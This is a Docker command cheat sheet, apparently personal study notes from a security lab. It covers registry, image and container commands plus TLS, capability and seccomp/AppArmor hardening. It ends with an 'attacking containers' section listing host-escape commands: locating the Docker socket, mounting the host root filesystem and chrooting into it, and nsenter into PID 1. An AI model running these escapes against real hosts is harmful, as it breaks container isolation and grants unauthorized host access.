# ======
# DOCKER
# ======

docker login # Login to docker registry
docker logout # Logout from docker registry
-docker login -u <username> # Login to docker
-docker push <username>/<image_name> # Publish an image to docker hub
-docker search <image_name> # Search Hub for an image
-docker pull <image_name> # Pull an image from a Docker Hub

# Images
docker build -t <image_name> # Build an image
docker image pull <image_name>:<tag> # Pull a docker image
docker image push <usernameofregistry:Imagename: tag> # Pushing an Image

# General
docker -d # Start the docker daemon
docker -help # Docker help
docker info # Display system-wide info
docker container start nginx # Start containers
docker container stop nginx # Stop containers
docker container restart nginx # Restart containers
docker run -it --cpus="1" mycontainer # Running container with allocated cpu
docker run -it --memory="20m" mycontainer # Running container with allocated memory
docker update --memory="40m" mycontainer # Updating container with allocated memory
docker inspect containername # View information about a container (including the resource limits set). If a resource limit is set to 0, this means that no resource limits have been set.

# Security
docker context create --docker host=ssh://myuser@remotehost --description="Development Environment" development-environment-host # Create a context
docker context use development-environment-host # Use specificed context
docker context use default # Switch back to default context

# Docker with TLS: --tlscacert This argument specifies the certificate of the certificate authority. --tlscert This argument specifies the certificate that is used to identify the device. --tlskey This argument specifies the private key that is used to decrypt the communication sent to the device.
dockerd --tlsverify --tlscacert=myca.pem --tlscert=myserver-cert.pem --tlskey=myserver-key.pem -H=0.0.0.0:2376 # Running Docker in TLS mode 
docker --tlsverify --tlscacert=myca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=SERVERIP:2376 info # Telling Docker (local) to authenticate using TLS

# Capabilities
docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE mywebserver # Assigning the NET_BIND_SERVICE capability to a container
capsh --print # Print what capabilities are assigned to a process

# Seccompt & Apparmor
docker run --rm -it --security-opt seccomp=/home/cmnatic/container1/seccomp/profile.json mycontainer # Apply seccomp profile to container runtime
sudo apparmor_parser -r -W /home/cmnatic/container1/apparmor/profile.json # Importing our AppArmor profile into AppArmor
docker run --rm -it --security-opt apparmor=/home/cmnatic/container1/apparmor/profile.json mycontainer # Applying our AppArmor profile when running a container


# ====================
# ATTACKING CONTAINERS
# ====================

ls -la /var/run | grep sock # Finding docker socket in container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh # 
ps aux # List running processes
nsenter --target 1 --mount --uts --ipc --net /bin/bash
